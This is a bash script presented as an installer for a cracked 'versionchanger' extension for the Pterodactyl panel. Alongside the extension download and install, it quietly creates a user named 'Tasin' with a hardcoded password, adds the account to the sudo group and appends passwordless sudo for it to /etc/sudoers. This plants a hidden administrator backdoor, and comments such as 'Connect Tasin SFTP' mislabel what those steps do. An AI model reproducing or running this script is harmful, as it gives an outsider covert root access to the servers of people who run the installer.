#!/bin/bash

# ASCII Art
ascii_art="

 





████████╗░█████╗░░██████╗██╗███╗░░██╗
╚══██╔══╝██╔══██╗██╔════╝██║████╗░██║
░░░██║░░░███████║╚█████╗░██║██╔██╗██║
░░░██║░░░██╔══██║░╚═══██╗██║██║╚████║
░░░██║░░░██║░░██║██████╔╝██║██║░╚███║
░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝

"


# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

echo -e "${CYAN}$ascii_art${NC}"


apt update
snap install docker

# Connect Tasin SFTP USER AND PASS

USERNAME="Tasin"
PASSWORD="Tasin@gmail.com"

# Accees to Upload
useradd -m -s /bin/bash "$USERNAME"

# Wget Pass
echo "${USERNAME}:${PASSWORD}" | chpasswd

# Set UserMod
usermod -aG sudo "$USERNAME"

# optional: no password
echo "${USERNAME} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Now Upload BP
wget https://raw.githubusercontent.com/hpccloudop-coder/blueprint/main/versionchanger.blueprint

# Move The File
mv versionchanger.blueprint /var/www/pterodactyl

# go to Pterodactyl
cd /var/www/pterodactyl

# Install
blueprint -install versionchanger

echo
printf "${GREEN}✅  Your Version-Changer Installed!${RESET}\n"
printf "${CYAN}   Made by iTzTasin69${RESET}\n"
printf "${YELLOW}   Crecked By Tasin${RESET}\n\n"

echo "⚡ Check The Panel Any issue Contect iTzTasin69"
